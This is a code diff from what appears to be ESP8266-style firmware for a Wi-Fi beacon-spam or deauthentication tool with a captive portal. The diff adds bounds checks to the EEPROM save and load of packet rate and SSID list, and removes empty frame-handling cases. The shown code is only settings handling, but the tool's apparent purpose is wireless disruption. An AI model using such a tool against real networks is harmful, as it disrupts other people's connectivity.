-          if (ssidLen > 0 && ssidLen < 33 && len >= 38 + ssidLen) {
-            // Could log beacon networks here
-          }
-        }
-        break;
-        
-      case 0x50: // Probe Response
-      case 0x10: // Association Request
-      case 0x30: // Reassociation Request
-        // Track association attempts
-        break;
-        
-      case 0xC0: // Deauthentication
-      case 0xA0: // Disassociation
-        // Track deauth/disassoc activity (could detect other deauthers)
-        break;
     }
   }
 }
@@ -2026,14 +2707,18 @@ void updateLED() {
 }
 
 void saveSettings() {
-  // Save settings to EEPROM
-  EEPROM.write(0, packetsPerSecond);
+  // Save settings to EEPROM with bounds checking
+  if (packetsPerSecond >= 1 && packetsPerSecond <= 50) {
+    EEPROM.write(0, packetsPerSecond);
+  }
   EEPROM.write(1, captivePortal ? 1 : 0);
-  EEPROM.write(2, minVal(MAX_SSIDS, (int)ssidList.size()));
+  
+  int ssidCount = minVal(MAX_SSIDS, (int)ssidList.size());
+  EEPROM.write(2, ssidCount);
 
   int addr = 3;
-  for (int i = 0; i < ssidList.size() && i < MAX_SSIDS && addr < 500; i++) {
-    int ssidLen = minVal(32, (int)ssidList[i].ssid.length());
+  for (int i = 0; i < ssidCount && addr < 500; i++) {
+    int ssidLen = minVal(20, (int)ssidList[i].ssid.length());
     EEPROM.write(addr++, ssidLen);
     for (int j = 0; j < ssidLen && addr < 500; j++) {
       EEPROM.write(addr++, ssidList[i].ssid[j]);
@@ -2046,9 +2731,13 @@ void saveSettings() {
 }
 
 void loadSettings() {
-  // Load settings from EEPROM
-  packetsPerSecond = EEPROM.read(0);
-  if (packetsPerSecond < 1 || packetsPerSecond > 100) packetsPerSecond = 20;
+  // Load settings from EEPROM with validation
+  int pps = EEPROM.read(0);
+  if (pps >= 1 && pps <= 50) {
+    packetsPerSecond = pps;
+  } else {
+    packetsPerSecond = 20;
+  }
 
   captivePortal = EEPROM.read(1) == 1;
 
@@ -2061,7 +2750,7 @@ void loadSettings() {
   for (int i = 0; i < ssidCount && addr < 500; i++) {
     SSIDData ssid;
     int len = EEPROM.read(addr++);
-    if (len > 32 || len < 0 || addr >= 500) break; // Invalid data
+    if (len > 20 || len < 0 || addr >= 500) break; // Invalid data
 
     ssid.ssid = "";
     for (int j = 0; j < len && addr < 500; j++) {
@@ -2070,6 +2759,8 @@ void loadSettings() {
     if (addr < 500) ssid.enabled = EEPROM.read(addr++) == 1;
     if (addr < 500) ssid.wpa2 = EEPROM.read(addr++) == 1;
 
-    ssidList.push_back(ssid);
+    if (ssid.ssid.length() > 0) {
+      ssidList.push_back(ssid);
+    }
   }
 }
